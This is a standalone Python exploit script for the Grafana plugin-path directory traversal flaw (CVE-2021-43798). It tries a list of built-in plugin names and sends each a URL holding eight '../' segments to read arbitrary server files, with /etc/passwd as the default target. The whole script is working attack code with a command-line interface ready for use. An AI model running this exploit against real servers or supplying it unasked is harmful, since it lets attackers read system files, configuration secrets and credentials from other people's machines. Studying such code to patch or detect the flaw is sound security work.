import requests
import sys


def exploit(target, port=3000, filepath="/etc/passwd"):
    """
    Grafana Directory Traversal (CVE-2021-43798)
    Reads arbitrary files from the server by abusing the plugin
    asset loading endpoint.

    Usage:
        python3 exploit.py <target_ip> [port] [filepath]
    """

    plugins = [
        "alertlist",
        "annolist",
        "barchart",
        "bargauge",
        "candlestick",
        "cloudwatch",
        "dashlist",
        "elasticsearch",
        "gauge",
        "geomap",
        "gettingstarted",
        "grafana-azure-monitor-datasource",
        "graph",
        "heatmap",
        "histogram",
        "influxdb",
        "jaeger",
        "logs",
        "loki",
        "mysql",
        "nodeGraph",
        "opentsdb",
        "piechart",
        "pluginlist",
        "postgres",
        "prometheus",
        "stackdriver",
        "stat",
        "state-timeline",
        "status-history",
        "table",
        "table-old",
        "tempo",
        "text",
        "timeseries",
        "welcome",
        "zipkin",
    ]

    traversal = "../" * 8
    base_url = f"http://{target}:{port}"

    print(f"[*] Target: {base_url}")
    print(f"[*] File: {filepath}")
    print(f"[*] Trying plugins...")

    for plugin in plugins:
        url = f"{base_url}/public/plugins/{plugin}/{traversal}{filepath.lstrip('/')}"
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200 and r.text.strip():
                print(f"[+] Plugin '{plugin}' worked!")
                print(f"[+] File contents:\n")
                print(r.text)
                return r.text
        except requests.exceptions.RequestException:
            continue

    print("[-] No working plugin found")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_ip> [port] [filepath]")
        print("Example: python3 exploit.py 10.10.10.15 3000 /etc/passwd")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
    filepath = sys.argv[3] if len(sys.argv) > 3 else "/etc/passwd"

    exploit(target, port, filepath)
